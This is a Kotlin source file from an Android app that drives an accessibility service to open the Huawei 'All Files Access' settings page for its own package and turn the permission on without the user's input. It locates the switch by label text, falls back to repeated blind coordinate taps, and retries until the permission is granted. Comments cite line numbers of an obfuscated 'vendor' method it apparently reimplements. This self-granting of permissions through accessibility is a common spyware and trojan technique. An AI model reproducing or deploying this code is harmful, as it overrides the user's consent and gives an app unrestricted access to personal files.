package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder
import kotlinx.coroutines.delay

/**
 * Step 8/10 -- All Files Access (vendor m212163b0, L1623-2049).
 *
 * Opens ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, then toggles the
 * permission switch ON. Only applicable on Android 11+ (API 30+).
 */
class HuaweiStep8AllFiles(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep8AllFiles"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step8/10] enter executeStep8AllFilesAccess")
        HuaweiStepLogger.phase(8, "所有文件访问开始", "vendor m212163b0 L1661", logs)

        if (isStep8Completed()) {
            HuaweiStepLogger.skip(8, "SP 已标记完成", logs)
            return
        }

        if (android.os.Build.VERSION.SDK_INT < 30) {
            logs.add("[Step8/10] Android 10及以下不需要此权限 (vendor L1668)")
            markStep8Completed()
            return
        }

        if (isExternalStorageManagerGranted()) {
            logs.add("[Step8/10] 已有所有文件访问权限 (vendor L1673)")
            markStep8Completed()
            return
        }

        val maxAttempts = 3
        var attempt = 1
        while (attempt < maxAttempts) {
            logs.add("[Step8/10] 第 $attempt 次尝试 (vendor outer loop i=$attempt)")
            try {
                logs.add("[Step8/10] 步骤1: 打开设置页面 (vendor L1681)")
                val intent = Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION").apply {
                    data = Uri.parse("package:${steps.ctx.packageName}")
                    flags = 276824064
                }
                val launcher: Context = service ?: steps.ctx
                launcher.startActivity(intent)
            } catch (e: Exception) {
                logs.add("[Step8/10] 异常: ${e.message} (vendor L1694)")
                attempt++
                continue
            }

            delay(300L)

            logs.add("[Step8/10] 步骤2: 页面验证 (vendor L1701)")
            if (!isOnAllFilesPageNow()) {
                logs.add("[Step8/10] 未进入正确页面，重新开始 (vendor L1703)")
                attempt++
                continue
            }

            logs.add("[Step8/10] 步骤3: 开启权限 (vendor L1714)")

            val switchTexts = listOf(
                "允许管理所有文件",
                "允许访问所有文件",
                "所有文件访问权限",
                "允许"
            )
            var switchFound = false
            for (switchText in switchTexts) {
                if (toggleAllFilesSwitch(switchText)) {
                    logs.add("[Step8/10] 通过文本'$switchText'开启 (vendor L1720)")
                    switchFound = true
                    break
                }
            }

            delay(100L)

            if (!switchFound && !isExternalStorageManagerGranted()) {
                logs.add("[Step8/10] 未找到文字开关，尝试坐标点击 (vendor L1729)")
                val w = steps.getScreenWidthPx()
                val h = steps.getScreenHeightPx()
                val xFactor: Float
                val yFactor: Float
                when {
                    w > 1080 -> { xFactor = 0.88f; yFactor = 0.265f }
                    w > 720  -> { xFactor = 0.85f; yFactor = 0.24f }
                    else     -> { xFactor = 0.87f; yFactor = 0.255f }
                }
                val tapX = (w * xFactor).toInt()
                val tapY = (h * yFactor).toInt()
                logs.add("[Step8/10] 屏幕: ${w}x${h}, 坐标: ($tapX, $tapY) (vendor L1743)")

                for (tapAttempt in 1..10) {
                    if (isExternalStorageManagerGranted()) {
                        logs.add("[Step8/10] 权限已开启 (vendor L1747)")
                        break
                    }
                    logs.add("[Step8/10] 第${tapAttempt}次点击: ($tapX, $tapY) (vendor L1749)")
                    gestureCoordinateTap(tapX.toFloat(), tapY.toFloat())
                    delay(300L)
                    if (tapAttempt % 3 == 0) {
                        clickFirstSwitchOnDetailPage(targetChecked = true)
                        delay(100L)
                    }
                }
            }

            delay(100L)

            for (verifyAttempt in 1..5) {
                if (!isExternalStorageManagerGranted()) {
                    clickFirstSwitchOnDetailPage(targetChecked = true)
                    delay(100L)
                } else {
                    logs.add("[Step8/10] 权限已开启 (vendor L1798)")
                    break
                }
            }

            if (isExternalStorageManagerGranted()) {
                markStep8Completed()
                HuaweiStepLogger.success(8, "所有文件访问权限已开启 + SP mark", "vendor L1802", successes)
            } else {
                HuaweiStepLogger.warn(8, "权限仍未开启 — 不 mark SP", "下次启动会重试", logs)
            }
            return
        }

        if (isExternalStorageManagerGranted()) {
            markStep8Completed()
            HuaweiStepLogger.success(8, "Loop exhausted 但权限已授予 + SP mark", "vendor L1710", successes)
        } else {
            HuaweiStepLogger.fail(8, "所有 attempt 均失败", "不写 SP mark — 下次启动会重试", failures)
        }
    }

    // ---- helpers ----

    private fun isStep8Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP8_ALL_FILES)

    private fun markStep8Completed() {
        HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP8_ALL_FILES)
    }

    private fun isExternalStorageManagerGranted(): Boolean {
        return ui.isExternalStorageManager()
    }

    private fun isOnAllFilesPageNow(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnAllFilesPage(root, steps.appLabel)
    }

    private fun toggleAllFilesSwitch(text: String): Boolean {
        return ui.openSwitch(text)
    }

    private suspend fun gestureCoordinateTap(x: Float, y: Float) {
        val svc = service ?: return
        GestureTapHelper.performTap(svc, x, y, durationMs = GestureTapHelper.TAP_DURATION_MS_LONG)
    }

    private fun clickFirstSwitchOnDetailPage(targetChecked: Boolean? = null): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val sw = findFirstSwitchInTree(root) ?: return false
        if (targetChecked != null && sw.isChecked == targetChecked) {
            return true
        }
        return sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun findFirstSwitchInTree(node: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (node == null || depth > 20) return null
        if (SwitchNodeFinder.isSwitchLike(node) || node.isCheckable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstSwitchInTree(child, depth + 1)
            if (found != null) return found
        }
        return null
    }
}
